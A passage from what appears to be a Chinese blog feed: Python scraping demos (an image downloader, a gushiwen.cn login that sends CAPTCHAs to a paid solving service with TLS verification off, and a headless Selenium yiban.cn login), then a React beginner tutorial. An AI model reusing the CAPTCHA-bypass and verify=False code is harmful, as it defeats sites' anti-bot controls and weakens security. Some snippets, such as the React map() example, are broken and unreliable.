<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;./彼岸图网&#x27;</span>) :</span><br><span class="line">    os.mkdir(<span class="string">&#x27;./彼岸图网&#x27;</span>)</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla / 5.0(Windows NT 10.0;Win64;x64) AppleWebKit/537.36(KHTML, likeGecko) Chrome/90.0.4430.85Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://pic.netbian.com/4kmeinv/&#x27;</span></span><br><span class="line"></span><br><span class="line">response = requests.get(url=url,headers=headers)</span><br><span class="line"></span><br><span class="line">html = etree.HTML(response.text)</span><br><span class="line"></span><br><span class="line">images = html.xpath(<span class="string">&#x27;//*[@id=&quot;main&quot;]/div[3]/ul/li&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> li <span class="keyword">in</span> images:</span><br><span class="line">    src = <span class="string">&#x27;https://pic.netbian.com&#x27;</span>+li.xpath(<span class="string">&#x27;./a/img/@src&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    img_name = li.xpath(<span class="string">&#x27;./a/img/@alt&#x27;</span>)[<span class="number">0</span>] + <span class="string">&#x27;.jpg&#x27;</span></span><br><span class="line"></span><br><span class="line">    img_name = img_name.encode(<span class="string">&#x27;iso-8859-1&#x27;</span>).decode(<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    img_data = requests.get(url=src, headers=headers).content</span><br><span class="line"></span><br><span class="line">    imgPath = <span class="string">&#x27;./彼岸图网/&#x27;</span> + img_name</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(imgPath,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(img_data)</span><br><span class="line">        <span class="built_in">print</span>(img_name+<span class="string">&#x27;-------------爬取成功！！！&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h1>6、古诗文网</h1>
<p>此 demo 需要用到一个打码平台，主要是在线识别验证码的，不过现在好像不能用了，可惜我的 10 块钱……</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_vcode</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        page_url = <span class="string">&#x27;https://so.gushiwen.cn/user/login.aspx?from=http://so.gushiwen.cn/user/collect.aspx&#x27;</span></span><br><span class="line"></span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla / 5.0(Windows NT 10.0;Win64;x64) AppleWebKit/537.36(KHTML, likeGecko) Chrome/90.0.4430.85Safari/537.36&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 保持会话</span></span><br><span class="line">        s = requests.session()</span><br><span class="line"></span><br><span class="line">        response = s.get(url=page_url,headers=headers)</span><br><span class="line"></span><br><span class="line">        tree = etree.HTML(response.text)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 验证码url</span></span><br><span class="line">        new_url = <span class="string">&#x27;https://so.gushiwen.cn&#x27;</span> + tree.xpath(<span class="string">&#x27;//*[@id=&quot;imgCode&quot;]/@src&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 请求验证码地址</span></span><br><span class="line">        resp = s.get(url=new_url, headers=headers,verify=<span class="literal">False</span>).content</span><br><span class="line"></span><br><span class="line">        file_name = <span class="string">&#x27;./联众识别V1-Python3-HTTP-实例/text.jpg&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 保存验证码到本地</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_name,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f :</span><br><span class="line">            f.write(resp)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 联众API在线识别验证码</span></span><br><span class="line">        files = &#123;</span><br><span class="line">            <span class="string">&#x27;upload&#x27;</span>: (file_name, <span class="built_in">open</span>(file_name, <span class="string">&#x27;rb&#x27;</span>), <span class="string">&#x27;jpg&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        api_post_url = <span class="string">&quot;http://v1-http-api.jsdama.com/api.php?mod=php&amp;act=upload&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 账号登陆数据</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;user_name&#x27;</span>: <span class="string">&#x27;联众账号&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;user_pw&#x27;</span>: <span class="string">&#x27;联众密码&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;yzm_minlen&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;yzm_maxlen&#x27;</span>: <span class="string">&#x27;8&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;yzmtype_mark&#x27;</span>: <span class="string">&#x27;1001&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;zztool_token&#x27;</span>: <span class="string">&#x27;联众token&#x27;</span>,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        r = requests.post(api_post_url, headers=headers, data=data, files=files, verify=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">        a = r.text</span><br><span class="line"></span><br><span class="line">     	<span class="comment">#  json.loads 可以识别出字符串中的json格式：去掉引号，并变成通用的json，所有语言都识别</span></span><br><span class="line">        b = json.loads(a)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 验证码</span></span><br><span class="line">        c = b[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;val&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        loginurl = <span class="string">&#x27;https://so.gushiwen.cn/user/login.aspx?from=http://so.gushiwen.cn/user/collect.aspx&#x27;</span></span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;email&#x27;</span>: <span class="string">&#x27;古诗文网账号&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;pwd&#x27;</span>: <span class="string">&#x27;古诗文网密码&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;code&#x27;</span>: c,</span><br><span class="line">        &#125;</span><br><span class="line">        new_page = s.post(url=loginurl,headers=headers,data=data).text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        text = s.get(<span class="string">&#x27;https://so.gushiwen.cn/user/collect.aspx&#x27;</span>, headers=headers).text</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./gushi.html&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&quot;UTF-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(text)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    download_vcode()</span><br></pre></td></tr></table></figure>
<h1>7、自动化 Selenium</h1>
<p><a href="https://chromedriver.storage.googleapis.com/index.html">chromedriver 下载地址</a>，查看谷歌浏览器对应版本：chrome://settings/help</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_login</span>(<span class="params">user,password</span>):</span><br><span class="line">    <span class="comment"># 后台静默运行</span></span><br><span class="line">    chrome_options = webdriver.ChromeOptions()</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--headless&#x27;</span>)</span><br><span class="line">    driver = webdriver.Chrome(executable_path=<span class="string">&#x27;chromedriver.exe&#x27;</span>, options=chrome_options)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 直接运行</span></span><br><span class="line">    <span class="comment"># driver = webdriver.Chrome(executable_path=&#x27;chromedriver.exe&#x27;)</span></span><br><span class="line"></span><br><span class="line">    driver.get(<span class="string">&#x27;https://www.yiban.cn/login&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输入账号密码</span></span><br><span class="line">    driver.find_element_by_id(<span class="string">&#x27;account-txt&#x27;</span>).send_keys(user)</span><br><span class="line">    driver.find_element_by_id(<span class="string">&#x27;password-txt&#x27;</span>).send_keys(password)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第一次点击确定</span></span><br><span class="line">    driver.find_element_by_id(<span class="string">&#x27;login-btn&#x27;</span>).click()</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    yiban_url = <span class="string">&#x27;https://www.yiban.cn/&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> driver.current_url == yiban_url:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;登录成功!当前无验证码!&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        element = driver.find_element_by_xpath(<span class="string">&#x27;//*[@class=&quot;captcha&quot;]&#x27;</span>)</span><br><span class="line">        time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">		<span class="comment"># 截图</span></span><br><span class="line">        element.screenshot(<span class="string">&#x27;index.png&#x27;</span>)</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            c = captcha()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;当前验证码为:&#x27;</span> + c)</span><br><span class="line"></span><br><span class="line">            driver.find_element_by_id(<span class="string">&#x27;login-captcha&#x27;</span>).send_keys(c)</span><br><span class="line">            time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">            driver.find_element_by_id(<span class="string">&#x27;login-btn&#x27;</span>).click()</span><br><span class="line">            time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> driver.current_url == yiban_url:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;登陆成功!&#x27;</span>)</span><br><span class="line">                time.sleep(<span class="number">3</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> get_login(user,password)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    user = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    password = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    get_login(user,password)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
  </entry>
  <entry>
    <title>React快速入门（第一章）</title>
    <url>/React/react_01/</url>
    <content><![CDATA[<h3 id="React特点">React特点</h3>
<ul>
<li>
<mark class="hl-label green">声明式设计</mark>  −React采用声明范式，可以轻松描述应用。
</li>
<li>
<mark class="hl-label green">高效</mark>  −React通过对DOM的模拟，最大限度地减少与DOM的交互。
</li>
<li>
<mark class="hl-label green">灵活</mark>  −React可以与已知的库或框架很好地配合。
</li>
<li>
<mark class="hl-label green">JSX</mark>  − JSX 是 JavaScript 语法的扩展。React 开发不一定使用 JSX ，但我们建议使用它。
</li>
<li>
<mark class="hl-label green">组件</mark>  − 通过 React 构建组件，使得代码更加容易得到复用，能够很好的应用在大项目的开发中。
</li>
<li>
<mark class="hl-label green">单向响应的数据流</mark>  − React 实现了单向响应的数据流，从而减少了重复代码，这也是它为什么比传统数据绑定更简单。
</li>
</ul>
<h3 id="入门">入门</h3>
<p>在head引入React相关文件</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- react基础语法js库 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">crossorigin</span> <span class="attr">src</span>=<span class="string">&quot;https://unpkg.com/react@16/umd/react.development.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- react解析DOM的js库 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">crossorigin</span> <span class="attr">src</span>=<span class="string">&quot;https://unpkg.com/react-dom@16/umd/react-dom.development.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 帮助把es6语法转为es5语法，在浏览器运行 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://unpkg.com/@babel/standalone/babel.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>React 实例</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/babel&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">ReactDOM</span>.<span class="title function_">render</span>(</span></span><br><span class="line"><span class="language-javascript">    <span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, world!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;app&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">  );</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>页面效果<br>
<img src="/img/page/page01.png" alt=""></p>
<h3 id="React-组件">React 组件</h3>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">App</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span>&#123;</span><br><span class="line">    <span class="comment">// 静态数据(state 固定不变)</span></span><br><span class="line">    state = &#123;</span><br><span class="line">        <span class="attr">name</span>:<span class="string">&quot;张三&quot;</span>,</span><br><span class="line">        <span class="attr">age</span>:<span class="number">18</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// render()用于渲染组件</span></span><br><span class="line">    <span class="title function_">render</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">// jsx写法</span></span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">            <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">p</span>&gt;</span>我叫&#123;this.state.name&#125;,今年&#123;this.state.age&#125;岁<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">ReactDOM</span>.<span class="title function_">render</span>(</span><br><span class="line">    <span class="comment">// 引入组件</span></span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">App</span> /&gt;</span></span>,</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;app&quot;</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>页面效果<br>
<img src="/img/page/page02.png" alt=""></p>
<h3 id="事件绑定">事件绑定</h3>
<p>React事件绑定和原生js的不同之处在于React事件绑定必须使用驼峰命名,如：<mark class="hl-label green">onClick</mark> ,<mark class="hl-label green">onMouseOver</mark> <br>
且函数的 this 指向为 undefined , 解决方法：改为 <mark class="hl-label green">箭头函数</mark> </p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">App</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span>&#123;</span><br><span class="line">    <span class="comment">// 静态数据(state 固定不变)</span></span><br><span class="line">    state = &#123;</span><br><span class="line">        <span class="attr">name</span>:<span class="string">&quot;张三&quot;</span>,</span><br><span class="line">        <span class="attr">age</span>:<span class="number">18</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 函数</span></span><br><span class="line">    click = <span class="function">(<span class="params">event</span>)=&gt;</span>&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(event);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// render()用于渲染组件</span></span><br><span class="line">    <span class="title function_">render</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">// jsx写法</span></span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">            <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">p</span>&gt;</span>我叫&#123;this.state.name&#125;,今年&#123;this.state.age&#125;岁<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;this.click&#125;</span>&gt;</span>点击<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>打印效果<br>
<img src="/img/page/page03.png" alt=""></p>
<h3 id="修改数据">修改数据</h3>
<p>React 修改数据和微信小程序的 <mark class="hl-label green">setData</mark>  写法一样</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">App</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span>&#123;</span><br><span class="line">    <span class="comment">// 静态数据(state 固定不变)</span></span><br><span class="line">    state = &#123;</span><br><span class="line">        <span class="attr">name</span>:<span class="string">&quot;张三&quot;</span>,</span><br><span class="line">        <span class="attr">age</span>:<span class="number">18</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 函数 触发事件必须使用驼峰命名,如:onClick,onMouseOver</span></span><br><span class="line">    click = <span class="function">(<span class="params">event</span>)=&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(event);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>); <span class="comment">// undefined 解决this指向问题:改为箭头函数</span></span><br><span class="line">        <span class="comment">// 修改数据 内置修改数据方法 setState()</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">setState</span>(&#123;</span><br><span class="line">            <span class="attr">name</span>:<span class="string">&quot;李四&quot;</span></span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// render()用于渲染组件</span></span><br><span class="line">    <span class="title function_">render</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">// jsx写法</span></span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">            <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">p</span>&gt;</span>我叫&#123;this.state.name&#125;,今年&#123;this.state.age&#125;岁<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;this.click&#125;</span>&gt;</span>点击<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="设置样式">设置样式</h3>
<p>React 设置类名用<mark class="hl-label green">calssName</mark> ，一般写错会有错误提示，根据报错提示改正即可，css样式按原来css写法</p>
<p>报错如下:<br>
<img src="/img/page/page04.png" alt=""></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">App</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span>&#123;</span><br><span class="line">    <span class="title function_">render</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">            <span class="language-xml"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">className</span>=<span class="string">&quot;h1&quot;</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="数据遍历">数据遍历</h3>
<p>1、单独获取数据写法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">App</span>  <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span>&#123;</span><br><span class="line">    state = &#123;</span><br><span class="line">        <span class="attr">lists</span>:[<span class="string">&quot;张三&quot;</span>,<span class="string">&quot;李四&quot;</span>,<span class="string">&quot;王五&quot;</span>,<span class="string">&quot;赵六&quot;</span>]</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">render</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">            <span class="language-xml"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123;this.state.lists[0]&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span>  </span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123;this.state.lists[1]&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span>  </span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123;this.state.lists[2]&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span>  </span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123;this.state.lists[3]&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span>  </span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>页面效果:<br>
<img src="/img/page/page05.png" alt=""></p>
<p>2、<mark class="hl-label green">map()</mark> 数据遍历</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">App</span>  <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span>&#123;</span><br><span class="line">    state = &#123;</span><br><span class="line">        <span class="attr">lists</span>:[<span class="string">&quot;张三&quot;</span>,<span class="string">&quot;李四&quot;</span>,<span class="string">&quot;王五&quot;</span>,<span class="string">&quot;赵六&quot;</span>]</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">render</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title function_">render</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="comment">// 注意：遍历数据必须添加key，虚拟DOM查找数据替换</span></span><br><span class="line">            <span class="keyword">const</span> dataLists =  <span class="variable language_">this</span>.<span class="property">state</span>.<span class="property">lists</span>.<span class="title function_">map</span>(<span class="function">(<span class="params">item,index</span>)=&gt;</span>&#123;</span><br><span class="line">                <span class="language-xml"><span class="tag">&lt;<span class="name">li</span> <span class="attr">key</span>=<span class="string">&#123;index&#125;</span>&gt;</span>&#123;item&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">            &#125;)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> (<span class="language-xml"><span class="tag">&lt;<span class="name">ul</span>&gt;</span>&#123;dataLists&#125;<span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span>)</span><br><span class="line">        ) </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>页面效果:<br>
<img src="/img/page/page05.png" alt=""></p>
<p>3、判断有无条件</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">App</span>  <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span>&#123;</span><br><span class="line">    state = &#123;</span><br><span class="line">        <span class="attr">lists</span>:[<span class="string">&quot;张三&quot;</span>,<span class="string">&quot;李四&quot;</span>,<span class="string">&quot;王五&quot;</span>,<span class="string">&quot;赵六&quot;</span>]</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">render</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">            <span class="language-xml"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            &#123;</span></span><br><span class="line"><span class="language-xml">                this.state.lists.map((item,index)=&gt;&#123;</span></span><br><span class="line"><span class="language-xml">                    // 下标不等于 2 时显示</span></span><br><span class="line"><span class="language-xml">                    return index != 2 ?(<span class="tag">&lt;<span class="name">li</span> <span class="attr">key</span>=<span class="string">&#123;index&#125;</span>&gt;</span>&#123;item&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span>):null;</span></span><br><span class="line"><span class="language-xml">                &#125;)</span></span><br><span class="line"><span class="language-xml">            &#125;</span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>页面效果:<br>
<img src="/img/page/page06.png" alt=""></p>
<p>4、二元运算<br>
ajax 未开始请求到数据为 null 时，数据遍历会报错，可以根据二元运算来判断是否渲染</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">App</span>  <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span>&#123;</span><br><span class="line">    state = &#123;</span><br><span class="line">        <span class="attr">lists</span>:<span class="literal">null</span> <span class="comment">// null改为 [] 可省略二元运算</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">render</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">            <span class="language-xml"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            &#123;</span></span><br><span class="line"><span class="language-xml">                this.state.lists &amp;&amp; this.state.lists.map((item,index)=&gt;&#123;</span></span><br><span class="line"><span class="language-xml">                    return (<span class="tag">&lt;<span class="name">li</span> <span class="attr">key</span>=<span class="string">&#123;index&#125;</span>&gt;</span>&#123;item&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span>)</span></span><br><span class="line"><span class="language-xml">                &#125;)</span></span><br><span class="line"><span class="language-xml">            &#125;</span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="例子">例子</h3>
<p>表单提交添加数据并渲染到页面上，在显示的数据列表中，点击删除可以删除该条数据</p>
